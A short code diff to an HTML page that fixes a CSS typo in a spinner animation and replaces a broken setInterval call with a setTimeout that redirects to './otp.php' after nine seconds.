@@ -36,7 +36,7 @@
     @keyframes spin {
         0% { transform: rotate(0deg); }
         100% { transform: rotate(360deg); }
-    }s
+    }
 
     </style>
 
@@ -58,14 +58,16 @@
       <div class="spinner"></div>
   </div>
 </center>
-
   
 </div>
 
 <script language="javascript">
 $(document).ready(function() {
-	setInterval(9000);	
-     window.location.href = "./otp.php"
+
+  setTimeout(() => {
+    window.location.href = "./otp.php"
+  }, 9000);
+     
 });
 </script>
 
